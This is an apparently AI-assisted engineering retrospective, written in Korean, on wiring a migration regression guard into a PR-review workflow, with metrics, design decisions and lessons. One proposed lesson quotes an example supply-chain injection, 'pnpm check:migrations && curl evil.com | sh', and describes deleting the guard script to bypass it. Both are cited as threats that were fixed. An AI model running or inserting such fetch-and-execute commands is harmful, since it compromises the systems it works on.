# CANDID-042 회고: 회귀 가드 자동 호출 wiring (L-036 self-referential 첫 적용)

| 항목 | 값 |
|------|-----|
| **Task ID** | CANDID-042 |
| **제목** | 회귀 가드 자동 호출 wiring (`skill-review-pr` SKILL.md + 컨벤션 sync) |
| **Type / Priority** | chore / high |
| **Phase** | 1 |
| **출처** | CANDID-038 retro Action Item HIGH-A2 (L-036 첫 적용) |
| **의존** | CANDID-038, CANDID-041 (모두 merged) |
| **생성일** | 2026-05-25 18:33 |
| **완료일** | 2026-05-25 21:06 |
| **소요 (생성→완료)** | ~2.5h wall-clock / 실 작업 ~10분 |
| **Step / PR** | 1 step / PR [#62](https://github.com/wejsa/candidate-web/pull/62) |
| **머지 라인** | +73 / -5 (prLineLimit 200, 37%) |
| **fix loop** | 1회 (3 MAJOR in-PR fix) |
| **선례** | CANDID-038(가드 도입) → CANDID-041(가드 테스트) — closed loop 3번째 |

---

## 1. Speed (속도)

| 단계 | 시각 | 누적 |
|-----|------|------|
| Task claim | 18:33 | - |
| Plan + 승인 | 18:33~20:53 | (대화 인터럽트 포함) |
| Step 1 PR 생성 | 20:58:45 | - |
| Review 완료 + in-PR fix | 21:05:51 | +7m |
| Squash merge | 21:06:42 | +8m |

**병목**: 없음. impl→merge 단일 세션 ~10분 (정책/문서 변경의 특성). 최대 비중은 review 3-에이전트 병렬 분석(~6-7분).

---

## 2. Quality (품질)

| 지표 | 값 |
|------|-----|
| CRITICAL | **0건** |
| MAJOR | 9건 (in-PR fix 3, carry 6) |
| MINOR | 5건 |
| INFO | 5건 |
| 첫 리뷰 통과율 | COMMENT (self-PR, REQUEST_CHANGES 없음) |
| fix loop | 1회 (보안/일관성 핵심 MAJOR 3건) |
| 신규 vitest | 0건 (정책/문서 변경, 실행 코드 0건) |
| Pre-Review Guard | SKIP (prisma/migrations/** 매칭 0건 — 의도된 동작 확인) |
| 빌드/lint/typecheck | check:migrations + typecheck PASS (lint는 코드 변경 없어 skip) |

**총평**: 정책 변경(markdown only) 특성상 빌드 위험 0. 그러나 *정책의 파급력*은 가장 큼 — 본 PR 머지 후 모든 후속 PR이 §2.4를 통과. 3 에이전트 모두 보안 우회 경로(공급망 공격 + 가드 무력화) 독립 식별했고, in-PR fix로 머지 전 차단.

---

## 3. Patterns (패턴)

### Self-referential L-036 적용 패턴
본 PR이 L-036(자동화 선언과 wiring 동반)을 *자기 자신에게* 적용. 흥미로운 점: 초기 PR(commit 3257ed6)이 README 단언을 갱신하지 않아 **자기 모순 (L-036 위반)** 발생 → 리뷰에서 D-MAJOR-1로 즉시 surfaced → in-PR fix로 해소. 메타 패턴: *원칙을 도입하는 PR이 그 원칙을 어기는 케이스*가 가장 빈번한 회귀 지점.

### 3-에이전트 보안 위험 독립 식별 (수렴)
- **S-MAJOR-1 (보안)**: npm script 컬럼 명령어 injection
- **D-MAJOR-3 (도메인) + S-MAJOR-3 (보안)**: exit 2 가드 무력화
- 두 위험 모두 *2명 이상의 에이전트가 독립적으로 식별* — 보안 카테고리의 신뢰도 신호. 단일 에이전트 식별이었다면 carry 가능했을 항목이지만, 수렴 신호로 in-PR fix 우선 처리.

### 설계 트레이드오프 vs 보안 가드 분기
- **in-PR fix (3건)**: 모두 보안 우회 경로 또는 self-referential 일관성 위반 — 머지 전 차단 비용 ≪ 회귀 비용
- **carry (6건)**: 모두 설계 트레이드오프(fail silencing 정책, 표 컬럼 확장, autoFixable 분기, meta-guard 도입) — 별도 task 논의가 적합한 영역
- 분기 기준: "회귀 시 자동 복구 가능 여부" + "PR 작성자 단독 결정 가능 여부"

### Closed Loop 완성 (CANDID-038 → 041 → 042)
| 단계 | Task | 핵심 lesson | 적용 결과 |
|------|------|------------|----------|
| 1 | CANDID-038 | L-029 (CONCURRENTLY 금지) → 가드 도입 | scripts/check-migrations-no-concurrently.mjs |
| 2 | CANDID-041 | L-034 (가드 자체 단위 테스트 동반) → 첫 적용 | tests/scripts/check-migrations-no-concurrently.test.ts (15 fixture) |
| 3 | CANDID-042 | L-036 (선언과 wiring 동반) → 첫 적용 | skill-review-pr SKILL.md §2.4 |

각 retro가 다음 task의 trigger가 되는 회고-주도 closed loop이 정상 작동. 향후 신규 회귀 가드는 §2.4 표 한 줄 추가 + 3종 세트 PR로 표준화됨.

---

## 4. Decisions (설계 결정)

### 결정 1: wiring 범위 (SKILL.md only vs SKILL.md+CI vs SKILL.md+husky)
- **선택**: SKILL.md only
- **근거**: 프로젝트의 Claude Code 워크플로우 중심 철학 일치, 새 인프라(CI/husky) 미도입, 단일 파일 편집
- **트레이드오프**: 수동 `gh pr merge` 시 가드 우회 가능. *수동 머지 자체가 워크플로우 위반*이라는 묵시적 가정에 의존.
- **AskUserQuestion 확인 완료** (plan 단계)

### 결정 2: 가드 fail 시 동작 (즉시 REQUEST_CHANGES vs 정보 전달만)
- **선택**: 즉시 REQUEST_CHANGES + Rules/3-에이전트 리뷰 스킵
- **근거**: true "guard" 시맨틱스, 토큰 절감
- **트레이드오프**: 다른 보안 이슈 마스킹 위험 (D-MAJOR-2 + S-MAJOR-2로 surfaced → carry)
- **AskUserQuestion 확인 완료** (plan 단계)

### 결정 3: declarative 매핑 표 컬럼 설계 (5 vs 9 컬럼)
- **선택**: 5 컬럼 (글롭/script/ID/도입/근거) — 단순화
- **carry**: A-MAJOR-1으로 surfaced (timeout/severity/failPolicy/autoFixable 컬럼) — **YAGNI**, 2번째 가드 도입 시점에 확장
- 트레이드오프: 단순함 우선, 미래 확장은 breaking change로 처리 결정

### 결정 4: in-PR fix vs carry 분기 (9 MAJOR 중)
- **in-PR fix 3건**:
  - S-MAJOR-1 (보안: npm script 화이트리스트): 공급망 공격 차단 — 머지 전 필수
  - D-MAJOR-3 + S-MAJOR-3 (보안: exit 2 격상): 가드 무력화 공격 차단 — 머지 전 필수
  - D-MAJOR-1 (self-referential L-036 일관성): 본 PR이 정의한 원칙 자체 위반 — 머지 전 필수
- **carry 6건**: 설계 트레이드오프 + 미래 확장 + meta-guard 영역 — 별도 task

### 결정 5: 가드 인프라 변경 감지 분기 (exit 2 처리)
- **현상**: 가드 스크립트 삭제 + 위반 마이그 동시 제출 → exit 2 → WARNING + 정상 진행 (가드 무력화)
- **수정**: PR diff에 `scripts/check-*.mjs` 또는 `package.json check:* script` 변경 포함 시 exit 2를 REQUEST_CHANGES로 격상
- **메타 패턴**: "환경 오류" 분류 시 *동시 PR이 환경 자체를 변경하는가*를 escalation trigger로 사용 (정상 오류 vs 의도적 무력화 구분)

---

## 5. Lessons (학습)

### Keep (유지)
- **사용자 confirmation 기반 핵심 결정** (plan 단계 AskUserQuestion 2건): wiring 범위 + fail 동작 — 결정 추적성 확보 + 변경 시 근거 명확
- **3-에이전트 수렴 신호로 in-PR fix 우선순위 판단**: 단일 에이전트 식별은 carry, 복수 식별은 in-PR fix
- **declarative 매핑 표 + 단일 SSOT 원칙**: README/conventions가 표를 참조 (역참조 없음) — drift 방지

### Improve (개선)
- **원칙 도입 PR의 self-application 자체 검토**: L-036을 도입하면서 README 미갱신으로 self-referential 위반 발생. 향후 *원칙을 도입/강화하는 PR은 plan 단계에서 "본 원칙이 PR 자체에 적용되는가?" 체크리스트 추가 필수*
- **declarative 표 도입 시 보안 제약 동반**: 매핑 표가 명령어 column을 가지면 *항상* 화이트리스트/금지 패턴 명문화 필수 (S-MAJOR-1 회귀 회피)
- **환경 오류(exit 2) 정책 시 무력화 공격 시나리오 고려**: WARNING + 정상 진행 정책은 *동일 PR이 환경 자체를 변경하지 않는다*는 묵시 가정. escalation trigger 필수

### Learn (학습)
- **Meta-guard 개념**: 가드의 가드(L-034) → 가드 호출 wiring(L-036) → wiring 일관성 검증(meta-guard)의 3-layer 방어. 본 PR은 layer 2 완성, layer 3는 carry (CANDID-043 후보)
- **Self-referential 원칙 위반 패턴**: 원칙을 정의/도입하는 PR이 가장 빈번한 회귀 지점 — 정의 자체에 자기 적용 여부 검증이 빠지기 때문
- **exit code 분류의 보안 함의**: exit 0/1/2 같은 정상-실패-환경오류 분류는 *환경의 무결성*을 가정. 환경 변경 PR에서는 분류 신뢰도 0

### Try (시도)
- **다음 follow-up (D-MAJOR-4 + T-MAJOR-2/3) — `check-guard-wiring-consistency.mjs`**: §2.4 표 ↔ `scripts/check-*.mjs` ↔ `package.json check:*` ↔ `tests/scripts/check-*.test.ts` 4자 일치 정적 검증. layer 3 meta-guard 완성. L-034 + L-036 결합 절차의 자동 강제
- **`scripts/dryrun-guard.mjs` (T-MAJOR-1)**: 가드 도입 PR의 4번째 세트 — fail path까지 재현 가능한 dry-run으로 머지 전 검증
- **표 컬럼 확장 (A-MAJOR-1/2)**: 2번째 가드 도입 시점에 timeout/severity/failPolicy/autoFixable 컬럼 추가

---

## 6. Action Items (follow-up task 등록 권장)

### HIGH
| ID | 제안 task | 추정 라인 | priority | 근거 lesson |
|----|----------|---------|----------|------------|
| **A1** | meta-guard `check-guard-wiring-consistency.mjs` 도입 — §2.4 표 ↔ scripts/check-*.mjs ↔ package.json ↔ tests/scripts/*.test.ts 4자 일치 검증 (L-034+L-036 절차 자동 강제) | ~120 (스크립트 + vitest) | high |
| **A2** | 가드 fail 시 security 에이전트만 부분 실행 옵션 (D-MAJOR-2 + S-MAJOR-2) — 다른 보안 이슈 마스킹 회피 | ~50 | high |

### MEDIUM
| ID | 제안 task | 추정 라인 | priority |
|----|----------|---------|----------|
| **A3** | dry-run 절차 자동화 `scripts/dryrun-guard.mjs` (T-MAJOR-1) — 가드 도입 PR 4번째 세트로 통합 | ~80 | medium |
| **A4** | 매핑 표 컬럼 확장 (A-MAJOR-1) — timeout/severity/failPolicy/autoFixable. 2번째 가드 도입 시점에 트리거 | ~30 (표 + 처리 로직) | medium |
| **A5** | `--auto-fix` autoFixable 분기 (A-MAJOR-2) — A4와 함께 처리 | ~20 | medium |

### LOW
| ID | 제안 task | priority |
|----|----------|----------|
| **A6** | 정책/원칙 도입 PR plan 단계에 "self-application 체크리스트" 추가 (CLAUDE.md 변경 금지, 별도 가이드 문서로) | low |

---

## 7. 학습 반영 제안

### lessons-learned.json 업데이트

#### 기존 항목 갱신
- **L-036 appliedCount**: 1 → **2** (본 task의 self-referential 적용이 1번째 실제 사용)

#### 신규 lessons (3건 제안)

1. **L-NEW-D** (process, medium):
   *원칙을 도입/강화하는 PR은 plan 단계에서 "본 원칙이 PR 자체에 적용되는가?" 자기 적용 체크 필수 — self-referential 위반은 가장 빈번한 회귀 지점*
   
   description: L-036(자동화 선언과 wiring 동반) 도입 PR(CANDID-042)이 정작 README의 "PR 리뷰에서 호출" 단언을 SSOT 참조 형태로 갱신하지 않아 self-referential L-036 위반 발생 → D-MAJOR-1로 리뷰에서 surfaced. 메타 패턴: 새 원칙/컨벤션/체크리스트를 정의하는 PR이 그 정의를 가장 먼저 위반. plan 단계에 1줄 체크 ("본 PR이 도입하는 원칙이 PR 자체의 변경에 적용되는가?")로 회피 가능.

2. **L-NEW-E** (security, high):
   *declarative 매핑 표가 명령어 column을 가지면 항상 화이트리스트/금지 패턴 동반 — 공급망 공격 벡터*
   
   description: §2.4 매핑 표의 npm script 컬럼이 자유 텍스트일 때 `pnpm check:migrations && curl evil.com | sh` 같은 체이닝 가능. 매핑 표 추가 PR이 보안 검토 대상이 되지만 검출 룰 명문화 없으면 false negative. 컨벤션: 명령어 column 도입 시 (a) `&&`/`||`/`;`/`|`/`$(...)`/백틱/redirection 금지 (b) 가드 스크립트 본문도 read-only(no network, no fs.write 외 tmpdir, no git mutation) 강제 (c) 위반 시 매핑 표 PR REQUEST_CHANGES.

3. **L-NEW-F** (security, medium):
   *환경 오류(exit 2) 분류 시 "동일 PR이 환경 자체를 변경하는가" escalation trigger 도입 — 정상 오류 vs 의도적 무력화 구분*
   
   description: 가드 스크립트 exit 2(인프라 누락)를 WARNING + 정상 진행으로 처리하면 *가드 삭제 + 위반 동시 제출* 공격에 무방비. 정책: PR diff에 `scripts/check-*.mjs` 또는 `package.json check:* script` 변경이 포함되면 exit 2를 CRITICAL로 격상. 일반화: 환경 오류 처리 시 "환경 변경 PR인가?"를 트리거로 사용해 정상 운영 오류와 의도적 무력화 분리.

### 컨벤션/체크리스트 갱신 제안 (사용자 승인 필요)

- `_base/checklists/common.md` §"회귀 가드 도구 도입" 표에 다음 2행 추가:
  - **명령어 column 보안 제약** (L-NEW-E): declarative 매핑 표 도입 시 화이트리스트/금지 패턴 명문화 — MAJOR
  - **환경 오류 escalation 트리거** (L-NEW-F): "환경 변경 PR인가?"를 무력화 공격 escalation trigger로 — MAJOR
- (선택) `_base/checklists/common.md`에 "**원칙 도입 PR self-application 체크**" 신설 항목 (L-NEW-D)

CLAUDE.md는 절대 수정 금지 (skill 정책).

---

## 8. 메트릭 요약

| 카테고리 | 메트릭 | 값 |
|---------|--------|---|
| **Speed** | impl→merge | ~10분 (단일 세션) |
| **Quality** | CRITICAL / fix loop | 0 / 1 |
| **Code** | 라인 (PR 기준) | +73 / -5 |
| **Code** | 신규 파일 / 수정 | 0 / 4 |
| **Tests** | passing | 1107 / 1107 (회귀 0) |
| **Carry** | follow-up 항목 | 6건 (HIGH 2, MEDIUM 3, LOW 1) |
| **lessons-learned** | 적용 / 신규 제안 | 1 / 3 |
| **Closed loop** | CANDID-038 → 041 → 042 | **완성** (L-029 + L-034 + L-036 첫 적용) |

---

## 9. Closed Loop 종합 평가 (CANDID-038 → 041 → 042)

본 task는 회고-주도 follow-up closed loop의 3번째 마디이자 완결. 3 task의 메트릭 종합:

| Task | 라인 | fix loop | MAJOR carry | 신규 lessons | 핵심 |
|------|------|---------|------------|------------|------|
| CANDID-038 | +113 | 1 | 4 | L-034/035/036 (3건) | 가드 도입 |
| CANDID-041 | +252 | 1 | 3 | (없음 — meta-test) | 가드 자체 테스트 (L-034 첫 적용) |
| CANDID-042 | +73 | 1 | 6 | L-NEW-D/E/F (3건 제안) | 가드 호출 wiring (L-036 첫 적용) |
| **합계** | **+438** | **3** | **13** | **6 (3 add + 3 propose)** | **3-layer 방어 완성** |

**closed loop의 자연 증가 패턴**: 각 task가 다음 layer의 follow-up + 새 lesson 발견. 13건 누적 MAJOR carry는 회고 시스템이 "fix 1건 surface 1건" 비율로 누적 회귀를 발견하고 있음을 시사 — 정상 동작 신호이나, 누적 임계(>15? >20?) 도달 시 *consolidation task* 권장 (L-022 누적 임계 정책 재검토 트리거).

**향후**: §2.4 매핑 표 + 3종 세트 PR + meta-guard(A1 후속) 도입 시 4-layer 방어 완성. 회귀 가드 도입 비용이 표 한 줄 + 3개 파일 신규로 표준화되면, 비용 ≪ 가치 비율로 회귀 가드 도입 빈도 증가 예상.
